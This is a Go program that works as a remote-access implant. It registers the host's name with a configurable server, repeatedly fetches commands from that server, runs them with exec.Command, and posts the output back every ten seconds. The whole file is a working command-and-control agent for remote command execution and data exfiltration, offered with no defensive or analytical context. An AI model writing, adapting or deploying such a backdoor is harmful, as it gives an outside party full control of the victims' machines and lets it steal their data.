package main

import (
	"io"
	"net/http"
	"os"

	//"net/url"
	"os/exec"
	"strings"
	"time"
)

func runCommand(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	// Capture the output.
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", nil
	}
	return string(output), nil
}
func getHostName() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", nil
	}
	return hostname, nil
}
func getSession(hostname string, url string) (string, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", nil
	}
	req.Header.Set("host-name", hostname)
	//send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", nil
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		authorization := resp.Header.Get("Authorization")
		return authorization, nil
	}
	return "", nil
}
func main() {
	baseURL := "http://localhost:8000" // Change URL to server you want to connect to.
	data := ""
	hostname, _ := getHostName()
	Authorization, _ := getSession(hostname, baseURL)
	for {
		// Build the URL with the "data" parameter.
		//reqURL := baseURL + "/?data=" + url.QueryEscape(data)
		// Make a GET request to the server with the "data" parameter.
		req, err := http.NewRequest("POST", baseURL, strings.NewReader(data))
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", Authorization)
		req.Header.Set("Content-Type", "text/plain")
		req.Header.Set("host-name", hostname)
		//send the request
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusUnauthorized {
			hostname, _ = getHostName()
			Authorization, _ = getSession(hostname, baseURL)
			continue
		}

		// Read the response body.
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		// Split the body string into two variables.
		splitValues := strings.Fields(string(body))
		var command string
		var args []string
		if len(splitValues) > 0 {
			command = splitValues[0]
			if len(splitValues) > 1 {
				args = splitValues[1:]
			}
		}
		// Run the command.
		data, err = runCommand(command, args...)
		if err != nil {
			continue
		}
		// Wait for 5 seconds before making the next request.
		time.Sleep(10 * time.Second)
	}
}
